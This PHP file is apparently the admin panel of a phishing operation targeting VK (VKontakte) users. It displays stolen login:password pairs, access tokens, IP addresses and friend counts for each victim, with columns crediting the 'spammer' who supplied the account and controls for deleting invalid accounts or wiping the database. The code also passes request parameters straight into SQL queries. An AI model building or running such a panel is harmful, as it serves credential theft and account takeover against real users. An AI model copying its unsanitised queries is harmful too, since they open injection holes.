<?
include '../bdlog.php';

if(isset($_SESSION['admin'])) {
$msg = '';
if(isset($_GET['link'])) {
	$name = $_GET['name'];
	$linkk = $_GET['link'];
	$db->query("update data set `balance` = '$linkk' where `usersession` = '$name'");
	$msg = '<div class="callout callout-success">
                  <h5>Успех!</h5>

                  <p>Установлен новый баланс для пользователя <b>'.$name.'</b>.</p>
                </div>';
				
				// echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=../admin/index.php">';
}

if(isset($_GET['deluser'])) {
	
	$db->query("delete from data");
		$db->query("ALTER TABLE data AUTO_INCREMENT = 1");
	

	$msg = '<div class="callout callout-success">
                  <h5>Успех!</h5>

                  <p>Были удалены все пользователи.</p>
                </div>';
				
				echo '<META HTTP-EQUIV="REFRESH" CONTENT="1;URL=../admin/index.php">';
}

if (isset($_GET['del'])) {
		   $del = intval($_GET['del']);
		   $db->query ("delete from data where (id='$del')");
		   echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=index.php">';
		}

if(isset($_GET['deldown'])) {
	
	$db->query("update settings set `clicks` = '0'");
	$msg = '<div class="callout callout-success">
                  <h5>Успех!</h5>

                  <p>Счетчик скачиваний был очищен.</p>
                </div>';
				
				echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=../admin/index.php">';
}


if(isset($_GET['linkdel'])) {
	$linkdel = $_GET['linkdel'];
	$db->query("update data set `balance` = '0' where `id` = '$linkdel'");
	$msg = '<div class="callout callout-success">
                  <h5>Успех!</h5>

                  <p>Баланс пользователя был обнулен.</p>
                </div>';
}

} else { echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=auth.php">'; }
if(!isset($_SESSION['admin'])) { echo '<style> body {display:none !important;}'; }
$randch = rand(100,9999999999999999);
?>
<!DOCTYPE html>
<!--
This is a starter template page. Use this page to start your new project from
scratch. This page gets rid of all links and provides the needed markup only.
-->
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="x-ua-compatible" content="ie=edge">

  <title>Admin Panel</title>
  

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="plugins/font-awesome/css/font-awesome.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="dist/css/adminlte.css">
  <!-- Google Font: Source Sans Pro -->
  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
</head>
<body class="hold-transition sidebar-mini">

<div class="wrapper">

 
  <!-- /.navbar -->

  <!-- Main Sidebar Container -->
  <aside class="main-sidebar sidebar-dark-primary elevation-4">
    <!-- Brand Logo -->
    <a style="font-family:intro; color:#6CD089;" href="index.php" class="brand-link">
      <center><span class="brand-text font-weight-2px"> ADMIN PANEL </span></center>
    </a>
     <a href="index.php" class="brand-link">
      <center><span class="brand-text font-weight-light"><img src="leftl.png"> Аккаунтов в базе: <?=$colvousers?> <img src="right.png"></span></center>
    </a>
         <a href="?deluser=8" class="brand-link">
      <center><span class="brand-text font-weight-light"><img src="leftl.png"> Очистить базу <img src="right.png"></span></center>
    </a>
	<a href="neval.php" target="blank" class="brand-link">
      <center><span class="brand-text font-weight-light"><img src="leftl.png"> Удалить НЕвалид <img src="right.png"></span></center>
    </a>
	

    <!-- Sidebar -->
    <div class="sidebar">
      <!-- Sidebar user panel (optional) -->
      

      <!-- Sidebar Menu -->
      <nav class="mt-2">
        <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
          <!-- Add icons to the links using the .nav-icon class
               with font-awesome or any other icon font library -->
          <? include 'menu.php'; ?>
          
        </ul>
      </nav>
      <!-- /.sidebar-menu -->
    </div>
    <!-- /.sidebar -->
  </aside>

  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <div class="content-header">
      <div class="container-fluid">
        <div class="row mb-2">
          <div class="col-sm-6">
          </div>
        </div><!-- /.row -->
      </div><!-- /.container-fluid -->
    </div>
    <!-- /.content-header -->

    <!-- Main content -->
    <div class="content">
      <div class="container-fluid">
		<?=$msg?>
		<div class="col-md-12" style="display:inline-block;">
            
            <!-- /.card -->

            <div class="card card-primary">
              <div class="card-header">
                <h3 class="card-title">Аккаунты</h3> 
              </div>
              <!-- /.card-header -->
              <div class="card-body p-0">
                <table class="table table-condensed">
                  <tbody><tr>
                    <th>Данные</th>
                    <th>ФИ</th>
                    <th>Друзей</th>
					<th>Подписчиков</th>
					<th>Токен (нажми два раза и копируй)</th>
					<th>Айпи</th>
                    <th>От спамера</th>
					<th width=10px><img src="delete.png"></th>
                  </tr>
                  <? if(isset($_SESSION['admin'])) {
	$linkads = $db->query("SELECT * FROM data order by id desc");
																	
while ($resone = mysqli_fetch_array($linkads)) {
	
$ltm = date("d.m H:i",$resone['ip']);

if ($resone['str'] == 1 ){
$strda = 'Россия';
} else {
	$strda = 'Неизвестно';
}

if ($resone['pol'] == 1 ){
$polon = 'Ж';
} else if ($resone['pol'] == 2 ) {
	$polon = 'М';
} else {
	$polon = 'Нет';
}

$userid = $resone['userid'];
echo ' 
                    <td>'.$resone['login'].':'.$resone['pass'].'</td>
                    <td><a target="_blank" href="https://vk.com/id'.$userid.'">'.$resone['fio'].'</a></td>
                    <td>'.$resone['friends'].'</td>
					<td>'.$resone['followers'].'</td>
					<td><textarea readonly style="overflow: hidden" rows="1" wrap="off" cols="33">'.$resone['token'].'</textarea></td>
					<td>'.$resone['ip'].'</td>
                    <td>
                      '.$resone['fromsp'].'
                    </td>
					<td><a name=\"del\" href="index.php?del='.$resone["id"].'"><img src="del.png"></a></td>
                  </tr>';
      
		
				  } }
																				?>
				  
				 
                </tbody></table>
              </div>
              <!-- /.card-body -->
            </div>
            <!-- /.card -->
          </div>
		 
		  
        <!-- /.row -->
      </div><!-- /.container-fluid -->
    </div>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->

  <!-- Control Sidebar -->
  
  <!-- /.control-sidebar -->

  <!-- Main Footer -->
 
</div>
<!-- ./wrapper -->

<!-- REQUIRED SCRIPTS -->

<!-- jQuery -->
<script src="plugins/jquery/jquery.min.js"></script>
<!-- Bootstrap 4 -->
<script src="plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- AdminLTE App -->
<script src="dist/js/adminlte.min.js"></script>
</body>
</html>